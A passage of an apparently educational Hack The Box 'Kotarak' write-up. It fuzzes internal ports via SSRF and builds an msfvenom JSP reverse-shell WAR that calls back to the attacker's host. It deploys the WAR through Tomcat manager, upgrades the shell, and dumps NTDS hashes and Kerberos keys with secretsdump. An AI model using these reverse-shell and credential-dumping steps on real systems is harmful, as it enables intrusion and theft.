+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">wfuzz</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="o">-</span><span class="n">z</span><span class="w"> </span><span class="k">range</span><span class="p">,</span><span class="mi">1</span><span class="o">-</span><span class="mi">65535</span><span class="w"> </span><span class="c1">--hl=2 http://kotarak.htb:60000/url.php?path=localhost:FUZZ</span>
+
+<span class="nl">Warning</span><span class="p">:</span><span class="w"> </span><span class="n">Pycurl</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">compiled</span><span class="w"> </span><span class="n">against</span><span class="w"> </span><span class="n">Openssl</span><span class="p">.</span><span class="w"> </span><span class="n">Wfuzz</span><span class="w"> </span><span class="n">might</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="k">work</span><span class="w"> </span><span class="n">correctly</span><span class="w"> </span><span class="k">when</span><span class="w"> </span><span class="n">fuzzing</span><span class="w"> </span><span class="n">SSL</span><span class="w"> </span><span class="n">sites</span><span class="p">.</span><span class="w"> </span><span class="k">Check</span><span class="w"> </span><span class="n">Wfuzz</span><span class="err">&#39;</span><span class="n">s</span><span class="w"> </span><span class="n">documentation</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">more</span><span class="w"> </span><span class="n">information</span><span class="p">.</span><span class="w"></span>
+
+<span class="o">********************************************************</span><span class="w"></span>
+<span class="o">*</span><span class="w"> </span><span class="n">Wfuzz</span><span class="w"> </span><span class="mf">2.4</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">Web</span><span class="w"> </span><span class="n">Fuzzer</span><span class="w">                           </span><span class="o">*</span><span class="w"></span>
+<span class="o">********************************************************</span><span class="w"></span>
+
+<span class="nl">Target</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">kotarak</span><span class="p">.</span><span class="nl">htb</span><span class="p">:</span><span class="mi">60000</span><span class="o">/</span><span class="n">url</span><span class="p">.</span><span class="n">php</span><span class="vm">?</span><span class="k">path</span><span class="o">=</span><span class="nl">localhost</span><span class="p">:</span><span class="n">FUZZ</span><span class="w"></span>
+<span class="n">Total</span><span class="w"> </span><span class="nl">requests</span><span class="p">:</span><span class="w"> </span><span class="mi">65535</span><span class="w"></span>
+
+<span class="o">===================================================================</span><span class="w"></span>
+<span class="n">ID</span><span class="w">           </span><span class="n">Response</span><span class="w">   </span><span class="n">Lines</span><span class="w">    </span><span class="n">Word</span><span class="w">     </span><span class="n">Chars</span><span class="w">       </span><span class="n">Payload</span><span class="w">                                                                                                                      </span>
+<span class="o">===================================================================</span><span class="w"></span>
+
+<span class="mi">000000022</span><span class="err">:</span><span class="w">   </span><span class="mi">200</span><span class="w">        </span><span class="mi">4</span><span class="w"> </span><span class="n">L</span><span class="w">      </span><span class="mi">4</span><span class="w"> </span><span class="n">W</span><span class="w">      </span><span class="mi">62</span><span class="w"> </span><span class="n">Ch</span><span class="w">       </span><span class="ss">&quot;22&quot;</span><span class="w">                                                                                                                         </span>
+<span class="mi">000000090</span><span class="err">:</span><span class="w">   </span><span class="mi">200</span><span class="w">        </span><span class="mi">11</span><span class="w"> </span><span class="n">L</span><span class="w">     </span><span class="mi">18</span><span class="w"> </span><span class="n">W</span><span class="w">     </span><span class="mi">156</span><span class="w"> </span><span class="n">Ch</span><span class="w">      </span><span class="ss">&quot;90&quot;</span><span class="w">                                                                                                                         </span>
+<span class="mi">000000110</span><span class="err">:</span><span class="w">   </span><span class="mi">200</span><span class="w">        </span><span class="mi">17</span><span class="w"> </span><span class="n">L</span><span class="w">     </span><span class="mi">24</span><span class="w"> </span><span class="n">W</span><span class="w">     </span><span class="mi">187</span><span class="w"> </span><span class="n">Ch</span><span class="w">      </span><span class="ss">&quot;110&quot;</span><span class="w">                                                                                                                        </span>
+<span class="mi">000000200</span><span class="err">:</span><span class="w">   </span><span class="mi">200</span><span class="w">        </span><span class="mi">3</span><span class="w"> </span><span class="n">L</span><span class="w">      </span><span class="mi">2</span><span class="w"> </span><span class="n">W</span><span class="w">      </span><span class="mi">22</span><span class="w"> </span><span class="n">Ch</span><span class="w">       </span><span class="ss">&quot;200&quot;</span><span class="w">                                                                                                                        </span>
+<span class="mi">000000320</span><span class="err">:</span><span class="w">   </span><span class="mi">200</span><span class="w">        </span><span class="mi">26</span><span class="w"> </span><span class="n">L</span><span class="w">     </span><span class="mi">109</span><span class="w"> </span><span class="n">W</span><span class="w">    </span><span class="mi">1232</span><span class="w"> </span><span class="n">Ch</span><span class="w">     </span><span class="ss">&quot;320&quot;</span><span class="w">                                                                                                                        </span>
+<span class="mi">000000888</span><span class="err">:</span><span class="w">   </span><span class="mi">200</span><span class="w">        </span><span class="mi">78</span><span class="w"> </span><span class="n">L</span><span class="w">     </span><span class="mi">265</span><span class="w"> </span><span class="n">W</span><span class="w">    </span><span class="mi">3955</span><span class="w"> </span><span class="n">Ch</span><span class="w">     </span><span class="ss">&quot;888&quot;</span><span class="w">                                                                                                                        </span>
+<span class="mi">000060000</span><span class="err">:</span><span class="w">   </span><span class="mi">200</span><span class="w">        </span><span class="mi">78</span><span class="w"> </span><span class="n">L</span><span class="w">     </span><span class="mi">130</span><span class="w"> </span><span class="n">W</span><span class="w">    </span><span class="mi">1171</span><span class="w"> </span><span class="n">Ch</span><span class="w">     </span><span class="ss">&quot;60000&quot;</span><span class="w">                                                                                                                      </span>
+<span class="mi">000065535</span><span class="err">:</span><span class="w">   </span><span class="mi">200</span><span class="w">        </span><span class="mi">2</span><span class="w"> </span><span class="n">L</span><span class="w">      </span><span class="mi">0</span><span class="w"> </span><span class="n">W</span><span class="w">      </span><span class="mi">2</span><span class="w"> </span><span class="n">Ch</span><span class="w">        </span><span class="ss">&quot;65535&quot;</span><span class="w"></span>
+</pre></div>
+
+
+<p>As shown above wfuzz revealed other ports opened which we can probably use later. For now let's go back to uploading a war file and get a shell. To generate a shell embedded in a war file we can use msfvenom:</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">msfvenom</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">java</span><span class="o">/</span><span class="n">jsp_shell_reverse_tcp</span><span class="w"> </span><span class="n">LHOST</span><span class="o">=</span><span class="mf">10.10.14.4</span><span class="w"> </span><span class="n">LPORT</span><span class="o">=</span><span class="mi">1234</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">war</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">shell</span><span class="p">.</span><span class="n">war</span><span class="w"></span>
+<span class="n">Payload</span><span class="w"> </span><span class="k">size</span><span class="err">:</span><span class="w"> </span><span class="mi">1089</span><span class="w"> </span><span class="n">bytes</span><span class="w"></span>
+<span class="n">Final</span><span class="w"> </span><span class="k">size</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">war</span><span class="w"> </span><span class="k">file</span><span class="err">:</span><span class="w"> </span><span class="mi">1089</span><span class="w"> </span><span class="n">bytes</span><span class="w"></span>
+
+<span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">ll</span><span class="w"></span>
+<span class="n">total</span><span class="w"> </span><span class="mi">4</span><span class="w"></span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="c1">-- 1 root root 1089 Jan 24 06:42 shell.war</span>
+</pre></div>
+
+
+<p>Once the war file is ready we upload it from the web page and we can see it in the list of applications:</p>
+<p><img alt="" src="../images/kotarak-shell-upload.png">
+<img alt="" src="../images/kotarak-shell-panel.png"></p>
+<p>Now i set a netcat listener on port 1234 on my kali box and then I click on shell application in the tomcat manager panel (the shell link in the green screenshot above in the left). Once I click to that link I am redirected to this address "http://kotarak.htb:8080/shell/" in the browser and I am able to see this on my kali box:</p>
+<div class="highlight"><pre><span></span>root@Kali:~# nc -lvnp <span class="m">1234</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+connect to <span class="o">[</span><span class="m">10</span>.10.14.4<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span><span class="m">10</span>.10.10.55<span class="o">]</span> <span class="m">34780</span>
+whoami
+tomcat
+python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+tomcat@kotarak-dmz:/$ 
+</pre></div>
+
+
+<p>I ran the above python command to upgrade to an interactive bash shell. We still d*o not have tab-autocomplete, history, etc. so we can do the following to get a complete working shell (from the pty shell):</p>
+<p>hit <code>CTRL+Z</code> to put the shell in the background:</p>
+<div class="highlight"><pre><span></span><span class="err">tomcat@kotarak-dmz:/$ ^Z</span>
+<span class="err"> [1]+  Stopped                 nc -lvnp 1234</span>
+</pre></div>
+
+
+<p>run <code>echo $TERM</code> and <code>stty -a</code> to know the terminal type and the size of the current TTY respectively (rows 54; columns 190;)</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:~# echo $TERM</span>
+<span class="err">screen-256color</span>
+</pre></div>
+
+
+<p>and</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:~# stty -a</span>
+<span class="err">speed 38400 baud; rows 54; columns 190; line = 0;</span>
+<span class="err">intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = &lt;undef&gt;; eol2 = &lt;undef&gt;; swtch = &lt;undef&gt;; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O;min = 1; time = 0;-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel -iutf8opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc</span>
+</pre></div>
+
+
+<p>With the shell still in the background, now set the current STTY to type raw and tell it to echo the input characters with the following         command:</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:~# stty raw -echo</span>
+</pre></div>
+
+
+<p>Now foreground the shell with the <strong>fg</strong> command:</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:~# nc -lvnp 1234</span>
+<span class="err">                          reset</span>
+<span class="c">reset: unknown terminal type unknown</span>
+<span class="err">Terminal type? screen-256color</span>
+</pre></div>
+
+
+<p>You will have the netcat listener back. Digit <strong>reset</strong> to reinitialize the terminal and when we are asked for the terminal type we add the output of the <strong>echo $TERM</strong> command we ran before.</p>
+<ol>
+<li>
+<p>After the reset the shell should look normal again. The last step is to set the stty size to match our current Kali window (from the info gathered on point 2)</p>
+<p><code>tomcat@kotarak-dmz:/$ stty rows 54 columns 190</code></p>
+</li>
+</ol>
+<p>Now that we have a full interactive shell let's go ahead with getting the user.txt flag.</p>
+<div class="highlight"><pre><span></span><span class="err">tomcat@kotarak-dmz:/$ locate user.txt</span>
+<span class="err">locate user.txt</span>
+<span class="err">/home/atanas/user.txt</span>
+<span class="err">/usr/share/doc/fontconfig/fontconfig-user.txt.gz</span>
+<span class="err">tomcat@kotarak-dmz:/$ cat /home/atanas/user.txt</span>
+<span class="err">cat /home/atanas/user.txt</span>
+<span class="c">cat: /home/atanas/user.txt: Permission denied</span>
+</pre></div>
+
+
+<p>The user.txt is owned by the user atanas and the user tomcat has no permission to read it so we need to find a way to privesc to atanas.</p>
+<p>Before running tools like LinEnum I have a quick look around and found this:</p>
+<div class="highlight"><pre><span></span><span class="err">tomcat@kotarak-dmz:/home$ ls -l</span>
+<span class="err">total 8</span>
+<span class="err">drwxr-xr-x 4 atanas atanas 4096 Aug 29  2017 atanas</span>
+<span class="err">drwxr-xr-x 3 tomcat tomcat 4096 Jul 21  2017 tomcat</span>
+<span class="err">tomcat@kotarak-dmz:/home$ cd tomcat/</span>
+<span class="err">tomcat@kotarak-dmz:/home/tomcat$ ls -l</span>
+<span class="err">total 4</span>
+<span class="err">drwxr-xr-x 3 tomcat tomcat 4096 Jul 21  2017 to_archive</span>
+<span class="err">tomcat@kotarak-dmz:/home/tomcat$ cd to_archive/</span>
+<span class="err">tomcat@kotarak-dmz:/home/tomcat/to_archive$ ls -l</span>
+<span class="err">total 4</span>
+<span class="err">drwxr-xr-x 2 tomcat tomcat 4096 Jul 21  2017 pentest_data</span>
+<span class="err">S tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ ls -l</span>
+<span class="err">total 28304</span>
+<span class="err">-rw-r--r-- 1 tomcat tomcat 16793600 Jul 21  2017 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit</span>
+<span class="err">-rw-r--r-- 1 tomcat tomcat 12189696 Jul 21  2017 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin</span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="err">tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ file *</span>
+<span class="err">20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit: data</span>
+<span class="err">20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin: MS Windows registry file, NT/2000 or above</span>
+</pre></div>
+
+
+<p>The <strong><em>.dit</em></strong> extension indicates a Directory Information Tree (DIT) file used by Active Directory, which saves a hierarchy of network objects and access permissions; The <strong><em>.bin</em></strong> is a SYSTEM registry hive file. There is a utility called <strong>impacket-secretsdump</strong> we can use to extract hashes from these files, but first we need to download the files to our kali box:</p>
+<p>I setup a python web server listener on the victim machine and I download both the <strong><em>.dit</em></strong> and <strong><em>.bin</em></strong> files with <code>wget</code> on my box.</p>
+<p>One I have downloaded the file I can use to extract the hashes as follow:</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="k">user</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">kotarak</span><span class="err">#</span><span class="w"> </span><span class="n">impacket</span><span class="o">-</span><span class="n">secretsdump</span><span class="w"> </span><span class="o">-</span><span class="n">ntds</span><span class="w"> </span><span class="mi">20170721114636</span><span class="n">_default_192</span><span class="mf">.168.110.133</span><span class="n">_psexec</span><span class="p">.</span><span class="n">ntdsgrab</span><span class="p">.</span><span class="n">_333512</span><span class="p">.</span><span class="n">dit</span><span class="w"> </span><span class="o">-</span><span class="k">system</span><span class="w"> </span><span class="mi">20170721114637</span><span class="n">_default_192</span><span class="mf">.168.110.133</span><span class="n">_psexec</span><span class="p">.</span><span class="n">ntdsgrab</span><span class="p">.</span><span class="n">_089134</span><span class="p">.</span><span class="n">bin</span><span class="w"> </span><span class="k">LOCAL</span><span class="w"></span>
+<span class="n">Impacket</span><span class="w"> </span><span class="n">v0</span><span class="mf">.9.20</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Copyright</span><span class="w"> </span><span class="mi">2019</span><span class="w"> </span><span class="n">SecureAuth</span><span class="w"> </span><span class="n">Corporation</span><span class="w"></span>
+
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Target</span><span class="w"> </span><span class="k">system</span><span class="w"> </span><span class="nl">bootKey</span><span class="p">:</span><span class="w"> </span><span class="mh">0x14b6fb98fedc8e15107867c4722d1399</span><span class="w"></span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Dumping</span><span class="w"> </span><span class="k">Domain</span><span class="w"> </span><span class="n">Credentials</span><span class="w"> </span><span class="p">(</span><span class="k">domain</span><span class="err">\</span><span class="nl">uid</span><span class="p">:</span><span class="nl">rid</span><span class="p">:</span><span class="nl">lmhash</span><span class="p">:</span><span class="n">nthash</span><span class="p">)</span><span class="w"></span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Searching</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">pekList</span><span class="p">,</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">patient</span><span class="w"></span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">PEK</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">found</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="nl">decrypted</span><span class="p">:</span><span class="w"> </span><span class="n">d77ec2af971436bccb3b6fc4a969d7ff</span><span class="w"></span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Reading</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">decrypting</span><span class="w"> </span><span class="n">hashes</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="mi">20170721114636</span><span class="n">_default_192</span><span class="mf">.168.110.133</span><span class="n">_psexec</span><span class="p">.</span><span class="n">ntdsgrab</span><span class="p">.</span><span class="n">_333512</span><span class="p">.</span><span class="n">dit</span><span class="w"> </span>
+<span class="nl">Administrator</span><span class="p">:</span><span class="mi">500</span><span class="err">:</span><span class="nl">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="nl">e64fe0f24ba2489c05e64354d74ebd11</span><span class="p">:</span><span class="o">::</span><span class="w"></span>
+<span class="nl">Guest</span><span class="p">:</span><span class="mi">501</span><span class="err">:</span><span class="nl">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="nl">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="p">:</span><span class="o">::</span><span class="w"></span>
+<span class="n">WIN</span><span class="o">-</span><span class="mi">3</span><span class="n">G2B0H151AC</span><span class="err">$:</span><span class="mi">1000</span><span class="err">:</span><span class="nl">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">668</span><span class="nl">d49ebfdb70aeee8bcaeac9e3e66fd</span><span class="p">:</span><span class="o">::</span><span class="w"></span>
+<span class="nl">krbtgt</span><span class="p">:</span><span class="mi">502</span><span class="err">:</span><span class="nl">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="nl">ca1ccefcb525db49828fbb9d68298eee</span><span class="p">:</span><span class="o">::</span><span class="w"></span>
+<span class="n">WIN2K8</span><span class="err">$:</span><span class="mi">1103</span><span class="err">:</span><span class="nl">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">160</span><span class="nl">f6c1db2ce0994c19c46a349611487</span><span class="p">:</span><span class="o">::</span><span class="w"></span>
+<span class="n">WINXP1</span><span class="err">$:</span><span class="mi">1104</span><span class="err">:</span><span class="nl">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">6</span><span class="nl">f5e87fd20d1d8753896f6c9cb316279</span><span class="p">:</span><span class="o">::</span><span class="w"></span>
+<span class="n">WIN2K31</span><span class="err">$:</span><span class="mi">1105</span><span class="err">:</span><span class="nl">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="nl">cdd7a7f43d06b3a91705900a592f3772</span><span class="p">:</span><span class="o">::</span><span class="w"></span>
+<span class="n">WIN7</span><span class="err">$:</span><span class="mi">1106</span><span class="err">:</span><span class="nl">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">24473180</span><span class="nl">acbcc5f7d2731abe05cfa88c</span><span class="p">:</span><span class="o">::</span><span class="w"></span>
+<span class="nl">atanas</span><span class="p">:</span><span class="mi">1108</span><span class="err">:</span><span class="nl">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">2</span><span class="nl">b576acbe6bcfda7294d6bd18041b8fe</span><span class="p">:</span><span class="o">::</span><span class="w"></span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Kerberos</span><span class="w"> </span><span class="n">keys</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="mi">20170721114636</span><span class="n">_default_192</span><span class="mf">.168.110.133</span><span class="n">_psexec</span><span class="p">.</span><span class="n">ntdsgrab</span><span class="p">.</span><span class="n">_333512</span><span class="p">.</span><span class="n">dit</span><span class="w"> </span>
+<span class="nl">Administrator</span><span class="p">:</span><span class="n">aes256</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="err">:</span><span class="mi">6</span><span class="n">c53b16d11a496d0535959885ea7c79c04945889028704e2a4d1ca171e4374e2</span><span class="w"></span>
+<span class="nl">Administrator</span><span class="p">:</span><span class="n">aes128</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="err">:</span><span class="n">e2a25474aa9eb0e1525d0f50233c0274</span><span class="w"></span>
+<span class="nl">Administrator</span><span class="p">:</span><span class="n">des</span><span class="o">-</span><span class="n">cbc</span><span class="o">-</span><span class="nl">md5</span><span class="p">:</span><span class="mi">75375</span><span class="n">eda54757c2f</span><span class="w"></span>
+<span class="n">WIN</span><span class="o">-</span><span class="mi">3</span><span class="n">G2B0H151AC</span><span class="err">$:</span><span class="n">aes256</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="err">:</span><span class="mf">84e3</span><span class="n">d886fe1a81ed415d36f438c036715fd8c9e67edbd866519a2358f9897233</span><span class="w"></span>
+<span class="n">WIN</span><span class="o">-</span><span class="mi">3</span><span class="n">G2B0H151AC</span><span class="err">$:</span><span class="n">aes128</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="err">:</span><span class="n">e1a487ca8937b21268e8b3c41c0e4a74</span><span class="w"></span>
+<span class="n">WIN</span><span class="o">-</span><span class="mi">3</span><span class="n">G2B0H151AC</span><span class="err">$:</span><span class="n">des</span><span class="o">-</span><span class="n">cbc</span><span class="o">-</span><span class="nl">md5</span><span class="p">:</span><span class="n">b39dc12a920457d5</span><span class="w"></span>
+<span class="n">WIN</span><span class="o">-</span><span class="mi">3</span><span class="n">G2B0H151AC</span><span class="err">$:</span><span class="nl">rc4_hmac</span><span class="p">:</span><span class="mi">668</span><span class="n">d49ebfdb70aeee8bcaeac9e3e66fd</span><span class="w"></span>
+<span class="nl">krbtgt</span><span class="p">:</span><span class="n">aes256</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="err">:</span><span class="mf">14134e1</span><span class="n">da577c7162acb1e01ea750a9da9b9b717f78d7ca6a5c95febe09b35b8</span><span class="w"></span>
+<span class="nl">krbtgt</span><span class="p">:</span><span class="n">aes128</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="err">:</span><span class="mi">8</span><span class="n">b96c9c8ea354109b951bfa3f3aa4593</span><span class="w"></span>
+<span class="nl">krbtgt</span><span class="p">:</span><span class="n">des</span><span class="o">-</span><span class="n">cbc</span><span class="o">-</span><span class="nl">md5</span><span class="p">:</span><span class="mi">10</span><span class="n">ef08047a862046</span><span class="w"></span>
+<span class="nl">krbtgt</span><span class="p">:</span><span class="nl">rc4_hmac</span><span class="p">:</span><span class="n">ca1ccefcb525db49828fbb9d68298eee</span><span class="w"></span>
+<span class="n">WIN2K8</span><span class="err">$:</span><span class="n">aes256</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="err">:</span><span class="mi">289</span><span class="n">dd4c7e01818f179a977fd1e35c0d34b22456b1c8f844f34d11b63168637c5</span><span class="w"></span>
+<span class="n">WIN2K8</span><span class="err">$:</span><span class="n">aes128</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="err">:</span><span class="n">deb0ee067658c075ea7eaef27a605908</span><span class="w"></span>
+<span class="n">WIN2K8</span><span class="err">$:</span><span class="n">des</span><span class="o">-</span><span class="n">cbc</span><span class="o">-</span><span class="nl">md5</span><span class="p">:</span><span class="n">d352a8d3a7a7380b</span><span class="w"></span>
+<span class="n">WIN2K8</span><span class="err">$:</span><span class="nl">rc4_hmac</span><span class="p">:</span><span class="mi">160</span><span class="n">f6c1db2ce0994c19c46a349611487</span><span class="w"></span>
+<span class="n">WINXP1</span><span class="err">$:</span><span class="n">aes256</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="err">:</span><span class="mi">347</span><span class="n">a128a1f9a71de4c52b09d94ad374ac173bd644c20d5e76f31b85e43376d14</span><span class="w"></span>
+<span class="n">WINXP1</span><span class="err">$:</span><span class="n">aes128</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="err">:</span><span class="mf">0e4</span><span class="n">c937f9f35576756a6001b0af04ded</span><span class="w"></span>
+<span class="n">WINXP1</span><span class="err">$:</span><span class="n">des</span><span class="o">-</span><span class="n">cbc</span><span class="o">-</span><span class="nl">md5</span><span class="p">:</span><span class="mi">984</span><span class="n">a40d5f4a815f2</span><span class="w"></span>
+<span class="n">WINXP1</span><span class="err">$:</span><span class="nl">rc4_hmac</span><span class="p">:</span><span class="mi">6</span><span class="n">f5e87fd20d1d8753896f6c9cb316279</span><span class="w"></span>
+<span class="n">WIN2K31</span><span class="err">$:</span><span class="n">aes256</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="err">:</span><span class="n">f486b86bda928707e327faf7c752cba5bd1fcb42c3483c404be0424f6a5c9f16</span><span class="w"></span>
+<span class="n">WIN2K31</span><span class="err">$:</span><span class="n">aes128</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="err">:</span><span class="mi">1</span><span class="n">aae3545508cfda2725c8f9832a1a734</span><span class="w"></span>
+<span class="n">WIN2K31</span><span class="err">$:</span><span class="n">des</span><span class="o">-</span><span class="n">cbc</span><span class="o">-</span><span class="nl">md5</span><span class="p">:</span><span class="mi">4</span><span class="n">cbf2ad3c4f75b01</span><span class="w"></span>
+<span class="n">WIN2K31</span><span class="err">$:</span><span class="nl">rc4_hmac</span><span class="p">:</span><span class="n">cdd7a7f43d06b3a91705900a592f3772</span><span class="w"></span>
+<span class="n">WIN7</span><span class="err">$:</span><span class="n">aes256</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="err">:</span><span class="n">b9921a50152944b5849c706b584f108f9b93127f259b179afc207d2b46de6f42</span><span class="w"></span>
+<span class="n">WIN7</span><span class="err">$:</span><span class="n">aes128</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="err">:</span><span class="mi">40207</span><span class="n">f6ef31d6f50065d2f2ddb61a9e7</span><span class="w"></span>
+<span class="n">WIN7</span><span class="err">$:</span><span class="n">des</span><span class="o">-</span><span class="n">cbc</span><span class="o">-</span><span class="nl">md5</span><span class="p">:</span><span class="mi">89</span><span class="n">a1673723ad9180</span><span class="w"></span>
+<span class="n">WIN7</span><span class="err">$:</span><span class="nl">rc4_hmac</span><span class="p">:</span><span class="mi">24473180</span><span class="n">acbcc5f7d2731abe05cfa88c</span><span class="w"></span>
+<span class="nl">atanas</span><span class="p">:</span><span class="n">aes256</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="err">:</span><span class="mi">933</span><span class="n">a05beca1abd1a1a47d70b23122c55de2fedfc855d94d543152239dd840ce2</span><span class="w"></span>
+<span class="nl">atanas</span><span class="p">:</span><span class="n">aes128</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="err">:</span><span class="n">d1db0c62335c9ae2508ee1d23d6efca4</span><span class="w"></span>
+<span class="nl">atanas</span><span class="p">:</span><span class="n">des</span><span class="o">-</span><span class="n">cbc</span><span class="o">-</span><span class="nl">md5</span><span class="p">:</span><span class="mi">6</span><span class="n">b80e391f113542a</span><span class="w"></span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Cleaning</span><span class="w"> </span><span class="n">up</span><span class="p">...</span><span class="w"> </span>
+</pre></div>
+
+
+<p>Let's see if we can crack <code>atanas</code> and <code>Administrator</code> hashes. Always before using <code>hashcat</code> or any other tools is good practice to try some online crackers to save time:</p>
